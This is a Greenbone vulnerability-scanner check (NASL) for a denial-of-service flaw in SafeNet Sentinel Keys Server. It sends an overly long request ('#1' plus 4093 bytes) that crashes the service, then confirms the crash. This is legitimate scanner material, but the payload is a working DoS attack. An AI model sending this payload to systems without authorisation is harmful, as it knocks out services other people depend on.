# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802460");
  script_version("2025-03-10T05:35:40+0000");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"2025-03-10 05:35:40 +0000 (Mon, 10 Mar 2025)");
  script_tag(name:"creation_date", value:"2012-09-25 09:53:12 +0530 (Tue, 25 Sep 2012)");
  script_name("SafeNet Sentinel Protection Installer Long Request DoS Vulnerability - Active Check");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 7002);
  script_mandatory_keys("SentinelKeysServer/banner");

  script_xref(name:"URL", value:"http://1337day.com/exploits/19455");
  script_xref(name:"URL", value:"http://secunia.com/advisories/50685/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/21508/");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/50685");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2012/09/safenet-sentinel-keys-server-dos.html");

  script_tag(name:"summary", value:"Sentinel Protection Installer is prone to a denial of service
  (DoS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks if the service is
  still responding.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error in Sentinel Keys Server
  within the 'sntlkeyssrvr.exe' when handling long requests, can be exploited to cause a stack-based
  buffer overflow via an overly-long request.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause the
  application to crash, creating a denial-of-service condition.");

  script_tag(name:"affected", value:"Sentinel Protection Installer version 7.6.5
  (sntlkeyssrvr.exe v1.3.1.3) is known to be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:7002);

banner = http_get_remote_headers(port:port);
if(!banner || banner !~ "Server\s*:\s*SentinelKeysServer")
  exit(0);

# nb:
# - http_get() used below might fork on multiple hostnames and should be always before the first
#   open_sock_tcp() call
# - For simplicity within such an older check we're just calling http_host_name() instead directly
#   here as it will also fork
http_host_name(port:port);

if(!soc = open_sock_tcp(port))
  exit(0);

data = string("#1", crap(4093));
send(socket:soc, data:data);
close(soc);

soc = open_sock_tcp(port);
if(soc) {

  # nb:
  # - some time if server got crashed , It will respond to new sockets
  # - so server crash confirmation is required from response page here
  req = http_get(item:"/", port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  close(soc);
  if(!res || "<title>Sentinel License Monitor</title>" >!< res) {
    security_message(port:port);
    exit(0);
  }
} else {
  security_message(port:port);
  exit(0);
}

exit(99);
